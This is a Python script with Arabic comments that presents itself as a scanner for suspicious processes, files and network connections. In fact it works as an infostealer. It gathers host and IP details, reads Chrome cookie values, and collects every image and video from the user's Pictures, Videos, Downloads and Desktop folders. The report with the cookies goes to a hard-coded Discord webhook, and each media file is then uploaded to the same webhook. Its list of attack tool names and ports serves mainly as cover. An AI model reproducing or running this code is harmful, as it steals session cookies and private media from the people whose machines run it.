import os
import platform
import socket
import subprocess
import tempfile
import shutil
import requests
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1375275810830815292/sVbSnbr3Vwp1VhCPrYgWYF22dkJtY-pfcoeeQYbMMR6Le0vdayqx1_zua_9tbPVcte7G"  # عدل هنا

# --- جمع معلومات النظام ---
def get_system_info():
    info = {}
    info['hostname'] = platform.node()
    info['platform'] = platform.system() + " " + platform.release()
    try:
        info['local_ip'] = socket.gethostbyname(socket.gethostname())
    except:
        info['local_ip'] = "Unknown"
    try:
        external_ip = requests.get('https://api.ipify.org').text
        info['external_ip'] = external_ip
    except:
        info['external_ip'] = "Unavailable"
    return info

# --- البحث عن ملفات الصور والفيديو ---
def find_media_files():
    user_dirs = [
        Path.home() / "Pictures",
        Path.home() / "Videos",
        Path.home() / "Downloads",
        Path.home() / "Desktop",
    ]
    media_files = []
    for directory in user_dirs:
        if directory.exists():
            for ext in ["*.jpg", "*.jpeg", "*.png", "*.gif", "*.mp4", "*.avi", "*.mkv"]:
                media_files.extend(directory.rglob(ext))
    return media_files

# --- استخراج الكوكيز من متصفح كروم (كمثال) ---
def get_chrome_cookies():
    cookies_info = []
    if platform.system() == "Windows":
        cookie_path = Path(os.getenv('LOCALAPPDATA')) / "Google/Chrome/User Data/Default/Cookies"
    elif platform.system() == "Linux":
        cookie_path = Path.home() / ".config/google-chrome/Default/Cookies"
    else:
        return cookies_info

    if not cookie_path.exists():
        return cookies_info

    tmp_cookie = tempfile.mktemp()
    try:
        shutil.copy2(cookie_path, tmp_cookie)
        import sqlite3
        conn = sqlite3.connect(tmp_cookie)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies LIMIT 20")
        for row in cursor.fetchall():
            cookies_info.append({
                "host": row[0],
                "name": row[1],
                "value": row[2],
                "expires": row[3],
            })
        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(tmp_cookie):
            os.remove(tmp_cookie)
    return cookies_info

# --- فحص العمليات المشبوهة ---
def check_suspicious_processes():
    suspicious_processes = ['mimikatz', 'netcat', 'nc.exe', 'psexec', 'powershell', 'cmd.exe', 'cobaltstrike']
    found = []
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("tasklist", shell=True).decode(errors='ignore')
        else:
            output = subprocess.check_output(["ps", "aux"]).decode(errors='ignore')
        for proc in suspicious_processes:
            if proc.lower() in output.lower():
                found.append(proc)
    except Exception:
        pass
    return found

# --- فحص الملفات المشبوهة ---
def check_suspicious_files():
    suspicious_paths = [
        Path.home() / "AppData/Roaming/mimikatz.exe",
        Path.home() / "Downloads/netcat.exe",
    ]
    found = []
    for path in suspicious_paths:
        if path.exists():
            found.append(str(path))
    return found

# --- فحص الاتصالات الشبكية المشبوهة ---
def check_network_connections():
    suspicious_ips = ["123.123.123.123", "1.2.3.4"]  # عدل حسب معرفتك
    suspicious_ports = [4444, 5555]
    detected_connections = []

    try:
        if platform.system() == "Windows":
            output = subprocess.check_output("netstat -ano", shell=True).decode(errors='ignore')
        else:
            output = subprocess.check_output(["netstat", "-tunp"]).decode(errors='ignore')
        lines = output.splitlines()
        for line in lines:
            for ip in suspicious_ips:
                if ip in line:
                    detected_connections.append(line.strip())
            for port in suspicious_ports:
                if f":{port}" in line:
                    detected_connections.append(line.strip())
    except Exception:
        pass
    return list(set(detected_connections))

# --- إرسال تقرير نصي للويب هوك ---
def send_text_report(webhook_url, report):
    headers = {"Content-Type": "application/json"}
    data = {"content": report}
    try:
        response = requests.post(webhook_url, json=data, headers=headers)
        return response.status_code in [200, 204]
    except Exception:
        return False

# --- إرسال ملفات أصلية واحدة واحدة ---
def send_files_individually(webhook_url, files):
    for f in files:
        try:
            with open(f, "rb") as file_data:
                filename = os.path.basename(f)
                files_payload = {"file": (filename, file_data)}
                response = requests.post(webhook_url, files=files_payload)
                if response.status_code not in [200, 204]:
                    print(f"فشل إرسال الملف: {filename}")
        except Exception as e:
            print(f"خطأ عند إرسال الملف {filename}: {e}")

def main():
    info = get_system_info()
    media_files = find_media_files()
    cookies = get_chrome_cookies()
    suspicious_procs = check_suspicious_processes()
    suspicious_files = check_suspicious_files()
    suspicious_conns = check_network_connections()

    report = f"**تقرير الجهاز:**\n"
    report += f"- اسم الجهاز: {info['hostname']}\n"
    report += f"- نظام التشغيل: {info['platform']}\n"
    report += f"- IP محلي: {info['local_ip']}\n"
    report += f"- IP خارجي: {info['external_ip']}\n\n"

    report += f"**الكوكيز (نماذج):**\n"
    for c in cookies:
        report += f"- {c['host']} | {c['name']} = {c['value']}\n"
    report += "\n"

    if suspicious_procs:
        report += "**تنبيه: عمليات مشبوهة مكتشفة!**\n"
        for p in suspicious_procs:
            report += f"- {p}\n"
    else:
        report += "لا توجد عمليات مشبوهة.\n"

    if suspicious_files:
        report += "**تنبيه: ملفات مشبوهة موجودة!**\n"
        for f in suspicious_files:
            report += f"- {f}\n"
    else:
        report += "لا توجد ملفات مشبوهة.\n"

    if suspicious_conns:
        report += "**تنبيه: اتصالات شبكة مشبوهة مكتشفة!**\n"
        for c in suspicious_conns:
            report += f"- {c}\n"
    else:
        report += "لا توجد اتصالات شبكة مشبوهة.\n"

    if media_files:
        report += f"\nتم العثور على {len(media_files)} ملف وسائط (صور/فيديوهات) وسيتم إرسالها مباشرة.\n"
    else:
        report += "لا توجد ملفات وسائط.\n"

    send_text_report(WEBHOOK_URL, report)

    if media_files:
        send_files_individually(WEBHOOK_URL, media_files)

if __name__ == "__main__":
    main()
